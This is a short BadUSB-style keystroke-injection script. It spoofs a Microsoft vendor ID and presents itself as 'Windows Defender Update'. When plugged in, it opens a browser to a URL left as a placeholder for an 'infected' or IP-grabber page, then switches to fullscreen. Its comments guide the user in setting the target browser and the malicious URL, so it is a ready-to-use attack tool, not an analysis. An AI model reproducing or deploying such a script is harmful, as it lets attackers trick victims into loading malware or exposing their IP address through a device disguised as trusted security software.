REM
VID 045E
PID 0048
MAN Microsoft
PRO Windows Defender Update
GUI r
DELAY 1000
REM ~~ | Change line below to desired browser: chrome, firefox, iexplore, etc.
STRING chrome
ENTER
DELAY 4000
REM | Alt+D below moves cursor focus to the URL bar. This is needed for Internet Explorer and Edge (Does not impact Chrome or Firefox)
ALT d
REM ~~ | Change line below to desired URL
STRING https://<insert infected / ipgrabber here>
ENTER
REM ~~ | Change line below to "GUI UP" to maximize screen. Change line below to "F11" to fullscreen.
F11